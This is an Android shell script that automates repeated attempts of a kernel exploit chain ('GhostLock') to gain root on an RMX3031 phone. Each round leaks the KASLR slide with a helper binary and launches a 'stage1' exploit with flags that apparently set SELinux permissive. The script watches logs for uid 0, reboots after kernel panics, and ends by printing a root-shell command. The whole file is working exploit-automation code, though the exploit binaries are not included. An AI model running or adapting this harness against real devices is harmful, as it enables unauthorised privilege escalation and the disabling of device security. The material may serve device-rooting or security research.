#!/system/bin/sh
# GhostLock RMX3031 device-side auto loop (ported from auto_loop.ps1)
# Runs entirely on device at /data/local/tmp. No adb / PC needed while looping.
#
# Usage:
#   cd /data/local/tmp
#   nohup sh auto_loop.sh 12 60 > loop.log 2>&1 &
#     arg1 = rounds   (default 12)
#     arg2 = minUptimeSec (default 60)
#
# NOTE: a kernel panic reboots the device and kills this script.
#       After a reboot, just rerun the nohup line above (state files persist).

ROUNDS=${1:-12}
MINUP=${2:-60}
BIN=/data/local/tmp/stage1
WANT_MD5=${GL_MD5:-}          # optional: expected stage1 md5, export GL_MD5=... to enforce
ITERS=2000000

log() { echo "$(date '+%H:%M:%S') $*"; }

procs_of_stage1() {
    ps -A 2>/dev/null | grep -c '[s]tage1'
}

uptime_sec() {
    up=$(cat /proc/uptime 2>/dev/null)
    echo "${up%%.*}"
}

# ---------- clean baseline: uptime >= MINUP AND zero residual stage1 ----------
wait_clean_baseline() {
    w=0
    while [ $w -lt 60 ]; do
        w=$((w + 1))
        sec=$(uptime_sec)
        procs=$(procs_of_stage1)
        if [ "$sec" -ge "$MINUP" ] && [ "$procs" = "0" ]; then
            log "baseline OK: uptime=${sec}s procs=0"
            return 0
        fi
        if [ "$procs" != "0" ]; then
            log "dirty: uptime=${sec}s procs=$procs -> reboot needed"
            log "!! rebooting; script dies with device. AFTER REBOOT rerun:"
            log "!!   cd /data/local/tmp && nohup sh auto_loop.sh $ROUNDS $MINUP > loop.log 2>&1 &"
            sleep 2
            sync
            reboot
            return 1
        fi
        log "wait: uptime=${sec}s procs=$procs (< $MINUP)"
        sleep 10
    done
    log "!! baseline wait exceeded 60 checks, proceeding anyway"
    return 0
}

r=0
while [ $r -lt "$ROUNDS" ]; do
    r=$((r + 1))
    log "===== ROUND $r / $ROUNDS ====="

    wait_clean_baseline || exit 1

    # binary check (no push on device: verify not rolled back by f2fs checkpoint)
    got=$(md5sum "$BIN" 2>/dev/null | awk '{print $1}')
    if [ -z "$got" ]; then
        log "!! $BIN missing -> abort"
        exit 1
    fi
    if [ -n "$WANT_MD5" ] && [ "$got" != "$WANT_MD5" ]; then
        log "!! MD5 MISMATCH want=$WANT_MD5 got=$got -> abort (re-push binary via adb)"
        exit 1
    fi
    log "binary ok: $got"

    # re-solve slide (changes every boot)
    leak=$(cd /data/local/tmp && GHOSTLOCK_LEAK_ONLY=1 timeout 50 ./gl_leak 2>&1 | grep -i 'slide-kaslr-ok')
    slide=$(echo "$leak" | sed -n 's/.*slide=\([0-9a-fA-F]*\).*/\1/p')
    if [ -z "$slide" ]; then
        log "slide solve FAILED"
        sec=$(uptime_sec)
        procs=$(procs_of_stage1)
        if [ "$procs" != "0" ]; then
            log "dirty after leak fail -> reboot needed; rerun script after reboot"
            sleep 2; sync; reboot; exit 1
        fi
        log "clean -> next round without reboot"
        continue
    fi
    log "slide=0x$slide"

    baseSec=$(uptime_sec)
    rm -f glive.log gl_stage.mark
    setsid ./stage1 --aw-fops --slide 0x$slide --iters $ITERS --unlock-flag --permissive \
        > glive.log 2>&1 < /dev/null &
    log "stage1 launched (slide=0x$slide)"

    lastMark=""
    result=TIMEOUT
    i=0
    while [ $i -lt 200 ]; do
        i=$((i + 1))
        sleep 0.6
        marks=$(cat gl_stage.mark 2>/dev/null)
        if [ -n "$marks" ] && [ "$marks" != "$lastMark" ]; then
            lastMark=$marks
            log "[m$i] $(echo "$marks" | tr '\n' '|')"
        fi
        if [ $((i % 5)) -eq 0 ]; then
            if grep -aqE 'ROOT|getuid=0|su\.sock' glive.log 2>/dev/null; then
                log "[deep] $(grep -aE 'ROOT|getuid=0|su\.sock' glive.log | tail -2 | tr '\n' ' ')"
                result=ROOT
                break
            fi
        fi
        # do NOT stop at S6: keep polling GR* markers until ROOT / reboot / timeout
        sec=$(uptime_sec)
        if [ "$sec" -lt "$baseSec" ]; then
            result=REBOOT
            log "!!! REBOOT detected at poll $i"
            break
        fi
    done
    log "ROUND $r result=$result lastMark=$(echo "$lastMark" | tr '\n' '|' | tail -c 200)"

    # per-round post-mortem log on device
    { cat glive.log 2>/dev/null; echo "=== MARKS ==="; cat gl_stage.mark 2>/dev/null; } \
        > /data/local/tmp/round$r.log 2>/dev/null
    log "log saved -> /data/local/tmp/round$r.log"

    if [ "$result" = "ROOT" ]; then
        cp /data/local/tmp/round$r.log /data/local/tmp/awfops_SUCCESS.log
        log "*** ROOT ROUND $r ***  key lines:"
        grep -aE 'ROOT|uid=0|cred|ARBITRARY|GR[0-9]' glive.log 2>/dev/null | tail -30
        log "root daemon: cd /data/local/tmp && ./stage1 --su 'id'"
        exit 0
    fi

    if [ "$result" = "REBOOT" ]; then
        log "device panicked; script will be killed by reboot. Rerun after boot:"
        log "  cd /data/local/tmp && nohup sh auto_loop.sh $((ROUNDS - r)) $MINUP >> loop.log 2>&1 &"
        sleep 3
        exit 1
    fi

    # TIMEOUT: only reboot if stage1 residual left behind; otherwise just retry
    procs=$(procs_of_stage1)
    if [ "$procs" != "0" ]; then
        log "timeout with $procs residual stage1 -> reboot needed; rerun script after reboot"
        sleep 2; sync; reboot; exit 1
    fi
    log "timeout, clean state -> next round immediately (no reboot)"
done
log "=== ALL ROUNDS DONE ==="
